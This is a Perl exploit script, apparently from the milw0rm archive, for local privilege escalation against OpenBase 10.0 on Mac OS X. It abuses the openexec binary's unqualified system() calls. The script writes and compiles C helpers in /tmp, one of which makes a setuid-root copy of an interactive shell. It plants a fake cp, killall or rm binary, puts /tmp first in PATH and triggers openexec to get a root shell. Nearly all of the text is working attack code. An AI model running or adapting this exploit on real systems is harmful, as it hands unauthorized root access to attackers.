#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# <= ftp://www.openbase.com/pub/OpenBase_10.0 (vulnerable) ?
#
# This is some fairly blatant and retarded use of system()
#
# cd cp chmod chown rm mkdir and killall appear as strings in the binary hrmm can you cay system() !
# -restart -MachLaunch -launch -noexit -install_plugins -kill -install -uninstall and -deactivate all
# *may* be used to trigger these issues.
#
# I don't feel like seeing which flags call which binaries... just 3 is plenty to prove the point.
#
# Tested against OpenBase10.0.0_MacOSX.dmg

$binpath = "/Library/OpenBase/bin/openexec"; # Typical location.

$tgts{"0"} = "cp:$binpath -install";
$tgts{"1"} = "killall:$binpath -kill";
$tgts{"2"} = "rm:$binpath -uninstall";

unless (($target) = @ARGV) {
       print "\n\nUsage: $0 <target> \n\nTargets:\n\n";

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{"$key"});
               print "\t$key . $a - $b\n";
       }

       print "\n";
       exit 1;
}

$ret = pack("l", ($retval));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a - $b\n";

open(OP,">/tmp/finisterre.c");
printf OP "main()\n";
printf OP "{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\"chown root: /tmp/pwns ; chmod 4775 /tmp/pwns\"); }\n";

open(OP,">/tmp/pwns.c");
printf OP "main()\n";
printf OP "{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\"/bin/sh -i\"); }\n";

system("gcc -o /tmp/finisterre /tmp/finisterre.c");
system("gcc -o /tmp/pwns /tmp/pwns.c");

system("echo /bin/cp /tmp/finisterre /tmp/$a");
system("/bin/cp /tmp/finisterre /tmp/$a");

system("export PATH=/tmp:\$PATH; $b");
system("/tmp/pwns");

# milw0rm.com [2006-11-08]
